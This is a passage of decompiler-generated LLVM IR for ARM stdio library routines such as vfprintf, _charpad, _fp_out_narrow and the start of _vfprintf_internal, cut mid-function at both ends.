  store i32 ptrtoint (i32** @global_var_2d2a8.1026 to i32), i32* %r3.global-to-local, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  %v2_128744 = icmp eq i32 %storemerge12, 0
  br i1 %v2_128744, label %dec_label_pc_1287c, label %dec_label_pc_12860

dec_label_pc_12860:                               ; preds = %dec_label_pc_12854, %dec_label_pc_12860
  %v0_12868 = phi i32 [ %storemerge1, %dec_label_pc_12860 ], [ %storemerge12, %dec_label_pc_12854 ]
  %v1_12860 = inttoptr i32 %v0_12868 to i8*
  %v2_12860 = load i8, i8* %v1_12860, align 1
  %v3_12860 = zext i8 %v2_12860 to i32
  store i32 %v3_12860, i32* %r3.global-to-local, align 4
  %v1_12864 = and i32 %v3_12860, 64
  store i32 %v0_12868, i32* %r0.global-to-local, align 4
  store i32 75888, i32* @lr, align 4
  %v1_1286c = icmp ne i32 %v1_12864, 0
  call void @__pseudo_cond_branch(i1 %v1_1286c, i32 ptrtoint (i32* @global_var_12890.1037 to i32))
  %v0_12870 = load i32, i32* %r4.global-to-local, align 4
  %v1_12870 = add i32 %v0_12870, 32
  %v2_12870 = inttoptr i32 %v1_12870 to i32*
  %storemerge1 = load i32, i32* %v2_12870, align 4
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  %v2_12874 = icmp eq i32 %storemerge1, 0
  br i1 %v2_12874, label %dec_label_pc_12874.dec_label_pc_1287c_crit_edge, label %dec_label_pc_12860

dec_label_pc_12874.dec_label_pc_1287c_crit_edge:  ; preds = %dec_label_pc_12860
  %v11_1287c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1287c

dec_label_pc_1287c:                               ; preds = %dec_label_pc_12874.dec_label_pc_1287c_crit_edge, %dec_label_pc_12854
  %v11_1287c = phi i32 [ %v11_1287c.pre, %dec_label_pc_12874.dec_label_pc_1287c_crit_edge ], [ %v11_1287c13, %dec_label_pc_12854 ]
  %v2_1287c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1287c, i32* @r4, align 4
  ret i32 %v11_1287c

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 0, 2, 1 }
  uselistorder i32 ()* @__stdio_init_mutex, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_12860, { 1, 0 }
  uselistorder label %dec_label_pc_12834, { 1, 0 }
  uselistorder label %dec_label_pc_127f8, { 1, 0 }
}

define i32 @__stdio_wcommit() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12890 = load i32, i32* @r4, align 4
  store i32 %v3_12890, i32* %stack_var_-8, align 4
  %v0_12894 = load i32, i32* @r0, align 4
  %v1_12894 = add i32 %v0_12894, 8
  %v2_12894 = inttoptr i32 %v1_12894 to i32*
  %v3_12894 = load i32, i32* %v2_12894, align 4
  %v1_12898 = add i32 %v0_12894, 16
  %v2_12898 = inttoptr i32 %v1_12898 to i32*
  %v3_12898 = load i32, i32* %v2_12898, align 4
  %v9_1289c = icmp eq i32 %v3_12898, %v3_12894
  store i32 %v0_12894, i32* %r4.global-to-local, align 4
  br i1 %v9_1289c, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_12894, i32* %v2_12898, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  store i32 75952, i32* @lr, align 4
  %v1_128ac = xor i1 %v9_1289c, true
  call void @__pseudo_cond_branch(i1 %v1_128ac, i32 ptrtoint (i32* @global_var_166b8.1038 to i32))
  %v0_128b0 = load i32, i32* %r4.global-to-local, align 4
  %v1_128b0 = add i32 %v0_128b0, 8
  %v2_128b0 = inttoptr i32 %v1_128b0 to i32*
  %v3_128b0 = load i32, i32* %v2_128b0, align 4
  %v1_128b4 = add i32 %v0_128b0, 16
  %v2_128b4 = inttoptr i32 %v1_128b4 to i32*
  %v3_128b4 = load i32, i32* %v2_128b4, align 4
  %v2_128b8 = sub i32 %v3_128b4, %v3_128b0
  %v2_128bc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_128bc, i32* @r4, align 4
  ret i32 %v2_128b8

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_vfprintf(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %v2_128c4 = add i32 %tmp, 52
  %v3_128c4 = inttoptr i32 %v2_128c4 to i32*
  %v4_128c4 = load i32, i32* %v3_128c4, align 4
  store i32 %v4_128c4, i32* @r8, align 4
  %v2_128c8 = add i32 %tmp, 56
  store i32 %v2_128c8, i32* @r5, align 4
  %v2_128cc = ptrtoint i32* %stack_var_-40 to i32
  %v2_128d0 = icmp eq i32 %v4_128c4, 0
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %v2_128cc, i32* @r0, align 4
  br i1 %v2_128d0, label %dec_label_pc_128f0, label %dec_label_pc_1290c

dec_label_pc_128f0:                               ; preds = %entry
  %v1_128f8 = call i32 @__pthread_return_void()
  store i32 76044, i32* @lr, align 4
  %v1_12908 = call i32 @__pthread_return_0()
  %v0_1290c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1290c

dec_label_pc_1290c:                               ; preds = %entry, %dec_label_pc_128f0
  %v0_1291c = phi i32 [ %tmp, %entry ], [ %v0_1290c.pre, %dec_label_pc_128f0 ]
  %v1_1290c = inttoptr i32 %v0_1291c to i8*
  %v2_1290c = load i8, i8* %v1_1290c, align 1
  %v2_12914 = icmp ugt i8 %v2_1290c, -65
  br i1 %v2_12914, label %dec_label_pc_12934, label %dec_label_pc_12924

dec_label_pc_12924:                               ; preds = %dec_label_pc_1290c
  %v4_12924 = call i32 @__stdio_trans2w_o(i8* %v1_1290c, i32 128)
  %v2_12928 = icmp eq i32 %v4_12924, 0
  store i32 -1, i32* @r5, align 4
  br i1 %v2_12928, label %dec_label_pc_12924.dec_label_pc_12934_crit_edge, label %dec_label_pc_12948

dec_label_pc_12924.dec_label_pc_12934_crit_edge:  ; preds = %dec_label_pc_12924
  %v0_1293c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12934

dec_label_pc_12934:                               ; preds = %dec_label_pc_12924.dec_label_pc_12934_crit_edge, %dec_label_pc_1290c
  %v0_1293c = phi i32 [ %v0_1293c.pre, %dec_label_pc_12924.dec_label_pc_12934_crit_edge ], [ %v0_1291c, %dec_label_pc_1290c ]
  %v0_12934 = load i32, i32* @r7, align 4
  %v0_12938 = load i32, i32* @r6, align 4
  %v4_12940 = inttoptr i32 %v0_12934 to i8*
  %v5_12940 = call i32 @_vfprintf_internal(i32 %v0_1293c, i8* %v4_12940, i32 %v0_12938)
  store i32 %v5_12940, i32* @r5, align 4
  br label %dec_label_pc_12948

dec_label_pc_12948:                               ; preds = %dec_label_pc_12924, %dec_label_pc_12934
  %v0_129605 = phi i32 [ -1, %dec_label_pc_12924 ], [ %v5_12940, %dec_label_pc_12934 ]
  %v0_12948 = load i32, i32* @r8, align 4
  %v2_12948 = icmp eq i32 %v0_12948, 0
  br i1 %v2_12948, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_12948
  call void @__pseudo_branch(i32 90076)
  %v0_12960.pre = load i32, i32* @r5, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_12948, %bb
  %v0_12960 = phi i32 [ %v0_129605, %dec_label_pc_12948 ], [ %v0_12960.pre, %bb ]
  ret i32 %v0_12960

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_12948, { 1, 0 }
  uselistorder label %dec_label_pc_1290c, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v3_1297c = load i32, i32* @r4, align 4
  %v6_1297c = load i32, i32* @r5, align 4
  %v9_1297c = load i32, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg3, i32* @r4, align 4
  store i8 %arg2, i8* %stack_var_-17, align 1
  %v2_1299c2 = icmp eq i32 %arg3, 0
  %v2_129a0 = ptrtoint i8* %stack_var_-17 to i32
  br i1 %v2_1299c2, label %dec_label_pc_129bc, label %dec_label_pc_129b0

dec_label_pc_12998:                               ; preds = %dec_label_pc_129b0
  %v1_12998 = add i32 %v0_12998, -1
  store i32 %v1_12998, i32* @r4, align 4
  %v2_1299c = icmp eq i32 %v1_12998, 0
  %v0_129a8 = load i32, i32* @r6, align 4
  br i1 %v2_1299c, label %dec_label_pc_129bc.loopexit, label %dec_label_pc_129b0

dec_label_pc_129b0:                               ; preds = %entry, %dec_label_pc_12998
  %v0_129a84 = phi i32 [ %v0_129a8, %dec_label_pc_12998 ], [ %arg1, %entry ]
  %v3_129b0 = call i32 @__stdio_fwrite(i32 %v2_129a0, i32 1, i32 %v0_129a84)
  %v7_129b4 = icmp eq i32 %v3_129b0, 1
  %v0_12998 = load i32, i32* @r4, align 4
  br i1 %v7_129b4, label %dec_label_pc_12998, label %dec_label_pc_129bc.loopexit

dec_label_pc_129bc.loopexit:                      ; preds = %dec_label_pc_12998, %dec_label_pc_129b0
  %v0_129bc.ph = phi i32 [ %v0_12998, %dec_label_pc_129b0 ], [ 0, %dec_label_pc_12998 ]
  %v1_129bc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_129bc

dec_label_pc_129bc:                               ; preds = %dec_label_pc_129bc.loopexit, %entry
  %v1_129bc = phi i32 [ 0, %entry ], [ %v1_129bc.pre, %dec_label_pc_129bc.loopexit ]
  %v0_129bc = phi i32 [ 0, %entry ], [ %v0_129bc.ph, %dec_label_pc_129bc.loopexit ]
  %v2_129bc = sub i32 %v1_129bc, %v0_129bc
  store i32 %v3_1297c, i32* @r4, align 4
  store i32 %v6_1297c, i32* @r5, align 4
  store i32 %v9_1297c, i32* @r6, align 4
  ret i32 %v2_129bc

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_129bc.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_129b0, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_129c8 = load i32, i32* @r4, align 4
  store i32 %v3_129c8, i32* %stack_var_-24, align 4
  %v9_129c8 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_129d0 = and i32 %arg2, 128
  %v2_129d0 = icmp eq i32 %v1_129d0, 0
  %v0_129d4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_129d4, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_129d0, label %bb, label %dec_label_pc_129e8

bb:                                               ; preds = %entry
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12a28

dec_label_pc_129e8:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_129ec = call i32 @strlen(i8* %arg4)
  store i32 %v3_129ec, i32* %r0.global-to-local, align 4
  %v1_129f0 = load i32, i32* %r4.global-to-local, align 4
  %v2_129f0 = sub i32 %v1_129f0, %v3_129ec
  store i32 %v2_129f0, i32* @r4, align 4
  store i32 %v3_129ec, i32* @r5, align 4
  %tmp16 = icmp slt i32 %v2_129f0, 1
  br i1 %tmp16, label %.thread, label %dec_label_pc_12a08

.thread:                                          ; preds = %dec_label_pc_129e8
  store i32 %v3_129ec, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12a28

dec_label_pc_12a08:                               ; preds = %dec_label_pc_129e8
  %v0_12a08 = load i32, i32* @r6, align 4
  %v1_12a08 = urem i32 %v0_12a08, 128
  %v0_12a0c = load i32, i32* @r8, align 4
  store i32 %v0_12a0c, i32* %r0.global-to-local, align 4
  %v3_12a14 = trunc i32 %v1_12a08 to i8
  %v4_12a14 = call i32 @_charpad(i32 %v0_12a0c, i8 %v3_12a14, i32 %v2_129f0)
  store i32 %v4_12a14, i32* %r0.global-to-local, align 4
  %v1_12a18 = load i32, i32* @r4, align 4
  %v9_12a18 = icmp eq i32 %v4_12a14, %v1_12a18
  store i32 %v4_12a14, i32* %r6.global-to-local, align 4
  br i1 %v9_12a18, label %dec_label_pc_12a24, label %dec_label_pc_12a44

dec_label_pc_12a24:                               ; preds = %dec_label_pc_12a08
  %v0_12a24 = load i32, i32* @r5, align 4
  store i32 %v0_12a24, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12a28

dec_label_pc_12a28:                               ; preds = %bb, %.thread, %dec_label_pc_12a24
  %v5_12a34 = phi i32 [ %v0_12a24, %dec_label_pc_12a24 ], [ %arg3, %bb ], [ %v3_129ec, %.thread ]
  %tmp17 = icmp slt i32 %v5_12a34, 1
  br i1 %tmp17, label %.thread8, label %bb18

.thread8:                                         ; preds = %dec_label_pc_12a28
  br label %bb19

bb18:                                             ; preds = %dec_label_pc_12a28
  %v5_12a30 = load i32, i32* @r7, align 4
  br label %bb19

bb19:                                             ; preds = %.thread8, %bb18
  %storemerge = phi i32 [ 0, %.thread8 ], [ %v5_12a30, %bb18 ]
  %tmp20 = phi i1 [ false, %.thread8 ], [ true, %bb18 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp20, i32 ptrtoint (i32* @global_var_16774.1043 to i32))
  %v0_12a40 = load i32, i32* %r6.global-to-local, align 4
  %v2_12a40 = add i32 %storemerge, %v0_12a40
  store i32 %v2_12a40, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12a44

dec_label_pc_12a44:                               ; preds = %dec_label_pc_12a08, %bb19
  %v0_12a44 = phi i32 [ %v4_12a14, %dec_label_pc_12a08 ], [ %v2_12a40, %bb19 ]
  store i32 %v0_12a44, i32* %r0.global-to-local, align 4
  %v2_12a48 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_12a48, i32* %r4.global-to-local, align 4
  store i32 %v9_129c8, i32* %r6.global-to-local, align 4
  ret i32 %v0_12a44

; uselistorder directives
  uselistorder i32 %v0_12a44, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 7, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_12a44, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_12a28, { 2, 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp97 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i8 @__decompiler_undefined_function_2()
  %tmp100 = call i32 @__decompiler_undefined_function_0()
  %tmp101 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i32 @__decompiler_undefined_function_0()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i8 @__decompiler_undefined_function_2()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_12a4c = load i32, i32* @r4, align 4
  store i32 %v3_12a4c, i32* %stack_var_-36, align 4
  %v6_12a4c = load i32, i32* @r5, align 4
  %v15_12a4c = load i32, i32* @r8, align 4
  %v18_12a4c = load i32, i32* @sb, align 4
  %v21_12a4c = load i32, i32* @sl, align 4
  %v24_12a4c = load i32, i32* @fp, align 4
  %v2_12a54 = ptrtoint i32* %stack_var_-332 to i32
  store i32 %v2_12a54, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_12a54, i32* %r0.global-to-local, align 4
  %v0_12a60 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_12a60, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_12a68 = call i32 @_ppfs_init(i32* nonnull %stack_var_-332)
  store i32 %v2_12a68, i32* %r0.global-to-local, align 4
  %v1_12a6c = icmp slt i32 %v2_12a68, 0
  br i1 %v1_12a6c, label %dec_label_pc_12a74, label %dec_label_pc_12aa8

dec_label_pc_12a74:                               ; preds = %entry
  %v3_12a74 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_12a74, i32* @r4, align 4
  %v1_12a78 = inttoptr i32 %v3_12a74 to i8*
  store i32 %v3_12a74, i32* %r0.global-to-local, align 4
  %v3_12a7c = call i32 @strlen(i8* %v1_12a78)
  store i32 %v3_12a7c, i32* %r0.global-to-local, align 4
  %v2_12a80 = icmp eq i32 %v3_12a7c, 0
  br i1 %v2_12a80, label %bb, label %dec_label_pc_12a90

bb:                                               ; preds = %dec_label_pc_12a74
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13020

dec_label_pc_12a90:                               ; preds = %dec_label_pc_12a74
  %v0_12a90 = load i32, i32* @r4, align 4
  store i32 %v0_12a90, i32* %r0.global-to-local, align 4
  %v0_12a94 = load i32, i32* @fp, align 4
  store i32 %v0_12a94, i32* %r2.global-to-local, align 4
  %v3_12a98 = call i32 @__stdio_fwrite(i32 %v0_12a90, i32 %v3_12a7c, i32 %v0_12a94)
  store i32 %v3_12a98, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13020

dec_label_pc_12aa8:                               ; preds = %entry
  store i32 %v2_12a54, i32* %r0.global-to-local, align 4
  %v0_12aac = load i32, i32* @r5, align 4
  %v2_12ab0 = call i32 @_ppfs_prepargs(i32 %v2_12a54, i32 %v0_12aac)
  store i32 %v2_12ab0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v4_12b50 = zext i8 %tmp104 to i32
  %v2_12b58 = ptrtoint i32* %stack_var_-252 to i32
  %v2_12b78 = ptrtoint i32* %stack_var_-36 to i32
  %v2_12b90 = icmp eq i32 %tmp102, 0
  %v1_12ba4 = inttoptr i32 %tmp101 to i32*
  %v2_12e94 = ptrtoint i32* %stack_var_-180 to i32
  %v2_12db0 = ptrtoint i32* %stack_var_-44 to i32
  %v2_12dc4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_12d60 = add i32 %tmp101, 4
  %v4_12d60 = inttoptr i32 %v3_12d60 to i32*
  %v2_12d64 = ptrtoint i32* %stack_var_-328 to i32
  %v7_12c24 = zext i8 %tmp99 to i32
  %v2_12c60 = ptrtoint i32* %stack_var_-53 to i32
  %v5_12c68 = bitcast i32* %stack_var_-53 to i8*
  %v2_12c70 = icmp ugt i32 %tmp102, 4
  %v7_12c70 = icmp eq i32 %tmp102, 5
  %v0_13008.pre = load i32, i32* @r4, align 4
  %tmp132 = icmp slt i32 %tmp105, 1
  %v5_12b88187 = icmp sgt i32 %tmp103, 0
  %tmp195 = icmp ugt i32 %tmp102, 7
  %tmp196 = icmp ugt i32 %tmp102, 15
  %v2_12d84 = icmp ugt i32 %tmp102, 16
  %v7_12d84 = icmp eq i32 %tmp102, 17
  %v2_12d88 = xor i1 %v7_12d84, true
  %v3_12d88 = and i1 %v2_12d84, %v2_12d88
  %v2_12e24 = icmp ugt i32 %tmp102, 18
  %v7_12e24 = icmp eq i32 %tmp102, 19
  %v2_12e28 = xor i1 %v7_12e24, true
  %v3_12e28 = and i1 %v2_12e24, %v2_12e28
  %v7_12e88 = icmp eq i32 %tmp102, 20
  %v2_12bc8 = add i32 %tmp102, ptrtoint (i32* @global_var_23efc.1045 to i32)
  %v1_12bcc = add i32 %tmp102, add (i32 ptrtoint (i32* @global_var_23efc.1045 to i32), i32 -1)
  %v2_12bcc = inttoptr i32 %v1_12bcc to i8*
  %v2_12bf8 = xor i1 %v7_12c70, true
  %v3_12bf8 = and i1 %v2_12c70, %v2_12bf8
  %v7_12c2c = icmp eq i32 %tmp102, 1
  %v2_12c78 = xor i1 %v2_12c70, true
  %v3_12c78 = or i1 %v7_12c70, %v2_12c78
  %tmp197 = icmp ult i32 %tmp102, 3
  %v7_12ce0 = icmp eq i32 %tmp102, 3
  %v11_12cec = icmp eq i32 %tmp102, 4
  %v9_12b5c = mul nuw nsw i32 %v4_12b50, 8
  %v10_12b5c = add nsw i32 %v9_12b5c, -8
  %v6_12b64 = add i32 %v10_12b5c, %v2_12b58
  br label %dec_label_pc_13008

bb126:                                            ; preds = %dec_label_pc_12ac0.outer, %.thread7
  %v2_12ac0185 = phi i8 [ %v2_12ac0, %.thread7 ], [ %v2_12ac0181, %dec_label_pc_12ac0.outer ]
  %v1_12ad4184 = phi i32 [ %v2_12ad4, %.thread7 ], [ %v0_12ac049, %dec_label_pc_12ac0.outer ]
  %v8_12ac8 = icmp eq i8 %v2_12ac0185, 37
  br i1 %v8_12ac8, label %dec_label_pc_12adc, label %.thread7

.thread7:                                         ; preds = %bb126
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_12ad4 = add i32 %v1_12ad4184, 1
  store i32 %v2_12ad4, i32* @r4, align 4
  %v1_12ac0 = inttoptr i32 %v2_12ad4 to i8*
  %v2_12ac0 = load i8, i8* %v1_12ac0, align 1
  %v3_12ac0 = zext i8 %v2_12ac0 to i32
  store i32 %v3_12ac0, i32* %r3.global-to-local, align 4
  %v2_12ac4 = icmp eq i8 %v2_12ac0, 0
  br i1 %v2_12ac4, label %dec_label_pc_12adc, label %bb126

dec_label_pc_12adc:                               ; preds = %bb126, %.thread7, %dec_label_pc_12ac0.outer
  %v1_12ad4.lcssa = phi i32 [ %v0_12ac049, %dec_label_pc_12ac0.outer ], [ %v2_12ad4, %.thread7 ], [ %v1_12ad4184, %bb126 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_12adc = sub i32 %v1_12ad4.lcssa, %v5_12aec
  %v9_12adc = icmp eq i32 %v1_12ad4.lcssa, %v5_12aec
  br i1 %v9_12adc, label %dec_label_pc_12b10, label %dec_label_pc_12ae4

dec_label_pc_12ae4:                               ; preds = %dec_label_pc_12adc
  store i32 %v2_12adc, i32* @r5, align 4
  %tmp128 = icmp slt i32 %v2_12adc, 1
  br i1 %tmp128, label %bb130, label %bb129

bb129:                                            ; preds = %dec_label_pc_12ae4
  store i32 %v5_12aec, i32* %r0.global-to-local, align 4
  %v5_12af4 = load i32, i32* @fp, align 4
  store i32 %v5_12af4, i32* %r2.global-to-local, align 4
  br label %bb130

bb130:                                            ; preds = %dec_label_pc_12ae4, %bb129
  %tmp131 = phi i1 [ true, %bb129 ], [ false, %dec_label_pc_12ae4 ]
  call void @__pseudo_cond_branch(i1 %tmp131, i32 ptrtoint (i32* @global_var_16774.1043 to i32))
  %v0_12afc = load i32, i32* %r0.global-to-local, align 4
  %v1_12afc = load i32, i32* @r5, align 4
  %v9_12afc = icmp eq i32 %v0_12afc, %v1_12afc
  br i1 %v9_12afc, label %dec_label_pc_12b04, label %dec_label_pc_13018

dec_label_pc_12b04:                               ; preds = %bb130
  %v2_12b08 = add i32 %v0_12afc, %stack_var_-336.1.ph
  %v0_12b10.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12b10

dec_label_pc_12b10:                               ; preds = %dec_label_pc_12adc, %dec_label_pc_12b04
  %v0_12b24 = phi i32 [ %v5_12aec, %dec_label_pc_12adc ], [ %v0_12b10.pre, %dec_label_pc_12b04 ]
  %stack_var_-336.2 = phi i32 [ %stack_var_-336.1.ph, %dec_label_pc_12adc ], [ %v2_12b08, %dec_label_pc_12b04 ]
  %v1_12b10 = inttoptr i32 %v0_12b24 to i8*
  %v2_12b10 = load i8, i8* %v1_12b10, align 1
  %v3_12b10 = zext i8 %v2_12b10 to i32
  store i32 %v3_12b10, i32* %r3.global-to-local, align 4
  %v2_12b14 = icmp eq i8 %v2_12b10, 0
  br i1 %v2_12b14, label %dec_label_pc_13020, label %dec_label_pc_12b1c

dec_label_pc_12b1c:                               ; preds = %dec_label_pc_12b10
  %v1_12b1c = add i32 %v0_12b24, 1
  %v2_12b1c = inttoptr i32 %v1_12b1c to i8*
  %v3_12b1c = load i8, i8* %v2_12b1c, align 1
  %v4_12b1c = zext i8 %v3_12b1c to i32
  store i32 %v4_12b1c, i32* %r3.global-to-local, align 4
  %v7_12b20 = icmp eq i8 %v3_12b1c, 37
  store i32 %v1_12b1c, i32* %r2.global-to-local, align 4
  br i1 %v7_12b20, label %dec_label_pc_13010, label %dec_label_pc_12b2c

dec_label_pc_12b2c:                               ; preds = %dec_label_pc_12b1c
  store i32 %v2_12a54, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_12a54, i32* %r0.global-to-local, align 4
  store i32 %v1_12b1c, i32* %stack_var_-332, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_12b40 = call i32 @_ppfs_parsespec(i32* nonnull %stack_var_-332)
  store i32 %v2_12a54, i32* @r0, align 4
  %v0_12b48 = call i32 @_ppfs_setargs()
  store i32 %v0_12b48, i32* %r0.global-to-local, align 4
  store i32 %v4_12b50, i32* %ip.global-to-local, align 4
  store i32 %v2_12b58, i32* %r3.global-to-local, align 4
  br i1 %tmp132, label %.thread, label %bb133

.thread:                                          ; preds = %dec_label_pc_12b2c
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  br label %bb134

bb133:                                            ; preds = %dec_label_pc_12b2c
  store i32 %tmp103, i32* %r0.global-to-local, align 4
  store i32 %v6_12b64, i32* %r3.global-to-local, align 4
  br label %bb134

bb134:                                            ; preds = %.thread, %bb133
  %v0_12b7078 = phi i32 [ %v6_12b64, %bb133 ], [ %v2_12b58, %.thread ]
  store i32 %v2_12b78, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_12b88187, label %dec_label_pc_12b70, label %dec_label_pc_12b8c

dec_label_pc_12b70:                               ; preds = %bb134, %dec_label_pc_12b70
  %v5_12b80189 = phi i32 [ %v5_12b80, %dec_label_pc_12b70 ], [ %v2_12b78, %bb134 ]
  %v0_12b70188 = phi i32 [ %v1_12b74, %dec_label_pc_12b70 ], [ %v0_12b7078, %bb134 ]
  %v2_12b70 = add i32 %v5_12b80189, -4
  %v3_12b70 = inttoptr i32 %v2_12b70 to i32*
  store i32 %v0_12b70188, i32* %v3_12b70, align 4
  %v0_12b74 = load i32, i32* %r3.global-to-local, align 4
  %v1_12b74 = add i32 %v0_12b74, 8
  store i32 %v1_12b74, i32* %r3.global-to-local, align 4
  %v0_12b7c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_12b7c.pre = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_12b78, i32* @lr, align 4
  %v4_12b80 = mul i32 %v0_12b7c.pre, 4
  %v5_12b80 = add i32 %v4_12b80, %v2_12b78
  %v1_12b84 = add i32 %v0_12b7c.pre, 1
  store i32 %v1_12b84, i32* %r2.global-to-local, align 4
  %v5_12b88 = icmp slt i32 %v0_12b7c.pre, %v1_12b7c.pre
  br i1 %v5_12b88, label %dec_label_pc_12b70, label %dec_label_pc_12b8c

dec_label_pc_12b8c:                               ; preds = %dec_label_pc_12b70, %bb134
  store i32 %tmp102, i32* %r2.global-to-local, align 4
  br i1 %v2_12b90, label %dec_label_pc_12b98, label %dec_label_pc_12bbc

dec_label_pc_12b98:                               ; preds = %dec_label_pc_12b8c
  store i32 %tmp101, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-336.2, i32* %ip.global-to-local, align 4
  %v2_12ba4 = load i32, i32* %v1_12ba4, align 4
  store i32 %v2_12ba4, i32* %r0.global-to-local, align 4
  %v1_12ba8 = and i32 %v0_12bec, 3840
  store i32 %stack_var_-336.2, i32* %r2.global-to-local, align 4
  %v3_12bb0 = ashr i32 %stack_var_-336.2, 31
  store i32 %v3_12bb0, i32* %r3.global-to-local, align 4
  %v4_12bb4 = inttoptr i32 %v2_12ba4 to i8*
  %v5_12bb4 = call i32 @_store_inttype(i8* %v4_12bb4, i32 %v1_12ba8, i32 %stack_var_-336.2, i32 %v3_12bb0)
  store i32 %v5_12bb4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13004

dec_label_pc_12bbc:                               ; preds = %dec_label_pc_12b8c
  br i1 %tmp195, label %dec_label_pc_12d48, label %dec_label_pc_12bc4

dec_label_pc_12bc4:                               ; preds = %dec_label_pc_12bbc
  store i32 %v2_12bc8, i32* %r3.global-to-local, align 4
  %v3_12bcc = load i8, i8* %v2_12bcc, align 1
  %v4_12bcc = zext i8 %v3_12bcc to i32
  store i32 %v4_12bcc, i32* @r4, align 4
